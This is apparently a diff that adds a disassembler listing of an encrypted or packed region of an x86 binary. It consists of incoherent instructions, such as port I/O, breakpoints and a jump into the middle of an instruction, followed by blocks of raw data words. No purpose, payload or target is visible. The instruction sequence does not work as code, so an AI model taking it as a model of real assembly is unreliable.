@@ -1,0 +1,100 @@
+loc_418000:                            
+    dec     ebp
+    inc     edi
+    and     ch, 0F4h
+    shr     byte ptr [edi+64h], 18h
+    lahf
+    cmp     [ebx], dh
+    xchg    eax, ebp
+    mov     cl, 0DAh
+    fisttp  qword ptr [ebx]
+    int     3             
+    outsb
+loc_418013:
+    mov     al, fs:0D4A8A200h
+    aas
+    vpor    ymm7, ymm4, ymmword ptr [edi+ebp]
+    db      64h
+    lock mov bh, ch
+    wait
+    out     5Ch, eax
+    in      eax, dx
+    sbb     ds:0CD49EA61h[ecx*8], edx
+    outsb
+    mov     al, fs:18646EF8h
+    push    ebp
+    cdq
+    sbb     [edi+ecx*2], edx
+    scasb
+    bound   edx, [ecx+5DA3A689h]
+    sub     al, 6Eh ; 'n'
+    db      64h
+    sbb     ah, cl
+    in      eax, 21h        ; Interrupt controller, 8259A.
+    adc     al, 47h ; 'G'
+    and     ebp, [ebx+edx*4-68h]
+    out     dx, eax
+    cwde
+    xchg    eax, ecx
+    cdq
+    sub     bh, 5Dh ; ']'
+    sub     al, 43h ; 'C'
+    and     ebx, [esi+5DED0F04h]
+    sub     al, 0E5h
+    and     eax, edi
+    or      eax, 2C9B6686h
+    insd
+    in      eax, dx
+    pop     ebp
+    jo      short near ptr loc_418013+1
+    and     esp, ecx
+    int     3               ; Trap to Debugger
+    outsb
+    sbb     fs:[edi], ah
+    db      67h
+    out     dx, eax
+    pop     ebp
+    sbb     ch, ch
+    movsb
+    sbb     [ebp+2Bh], eax
+    mov     al, 93h
+    mov     [edx-19h], esp
+    lock int 57h
+    and     esp, ecx
+    mov     edi, 185DEF1Bh
+    in      eax, 29h
+    adc     [edi+3Ah], al
+    in      eax, 1Ch
+    inc     ebp
+    cmp     ebx, [ebx+edx*4-0F5A7D77h]
+    leave
+    in      eax, 29h
+    loopne  loc_4180AB
+    
+    dw 668Fh
+    dd 31E50D2Bh, 67840DE0h
+    db 93h, 81h, 82h
+                
+loc_4180AB:
+    movsd
+    stc
+    enter   0FFFFB55Dh, 1Bh
+    push    cs
+    in      eax, 31h
+    clc
+
+    db 0FFh, 3Bh, 9Ch
+    dd 0E7BA8193h, 295DCFF9h, 741B47A4h, 57E0C093h, 0B56D2055h
+    dd 31E50E2Bh, 6C2347CCh, 67FFD893h, 90FB45C8h, 0EF9133E6h
+    dd 29E5185Dh, 90FB4710h, 0ED9133E6h, 0E1E54D0Ch, 9B9132ECh
+    dd 8D828991h, 9B91336Fh, 646EC8A0h, 64A6A718h, 0EF669993h
+    dd 21E7C61Ch, 882B47E0h, 0EF6B24D9h, 85AF3455h, 0EFAFFF1Ah
+    dd 8EAF344Dh, 8823471Bh, 576A2DD9h, 0EFACCFC9h, 315D2C4Dh
+    dd 0B02347E0h, 576D2D9Bh, 11E57055h, 0EA624708h, 6782812Bh
+    dd 0EFACFFC9h, 29E5C04Dh, 0F53A4710h, 0EDBECFE4h, 9B90388Dh
+    dd 682B47E7h, 0EF668193h, 9B90388Dh, 0E53A45E7h, 90EB47E4h
+    dd 0ED9133E6h, 21E5205Dh, 65864FD0h, 6BA68991h, 9B901E9Dh
+    dd 3F3093E7h, 65620899h, 8855CC18h, 9BFE23F0h, 398B47E7h
+    dd 0A8A200DBh, 418h dup(0A8A200D4h), 646E00D4h, 646ECC18h
+    dd 380h dup(?)
+    ends
